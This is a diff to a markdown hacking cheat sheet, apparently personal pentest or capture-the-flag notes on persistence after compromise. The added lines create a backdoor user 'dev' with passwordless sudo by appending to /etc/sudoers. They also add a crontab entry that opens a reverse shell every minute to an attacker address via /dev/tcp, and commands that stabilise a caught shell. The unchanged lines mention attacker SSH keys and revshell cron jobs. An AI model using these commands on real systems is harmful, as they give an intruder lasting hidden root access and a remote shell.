@@ -1,5 +1,10 @@
 [generate an ssh key on attacker server](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)
 
+### add user
+
+```
+echo -e "drowssap\\drowssap\\" | useradd dev; usermod -aG sudo dev; echo "dev ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+```
 
 ### create ssh keys
 
@@ -20,18 +25,29 @@ ssh -i id_rsa user@${box_ip}
 
 ### basic reverse shells [revshell generator](https://www.revshells.com/)
 
-**crontab reverse shells (every minute)**
+**crontab / cronjob reverse shells (every minute)**
+
+nano /etc/
 
 ```
 * * * * *    /lib/systemd/revshell.sh
 * * * * *    /usr/bin/revshell.sh
+* * * * *    bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
 ```
 ### upgrade revserse shells
+
+
+**improve screen**
+
+```
+export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+```
 
 **python**
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
+
 
 **socat** - [get socat here](https://github.com/andrew-d/static-binaries)
 
